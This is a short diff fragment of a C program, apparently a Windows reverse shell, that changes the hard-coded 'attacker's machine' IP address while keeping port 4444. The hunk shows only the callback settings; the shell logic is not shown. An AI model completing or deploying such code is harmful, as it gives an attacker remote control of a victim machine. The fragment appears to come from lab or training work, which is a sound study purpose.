@@ -17,7 +17,7 @@ PROCESS_INFORMATION processInfo;
 
 int main(int argc, char* argv[]) {
   // IP and port details for the attacker's machine
-  char *attackerIP = "192.168.100.99";
+  char *attackerIP = "192.168.100.141";
   short attackerPort = 4444;
 
   // initialize socket library
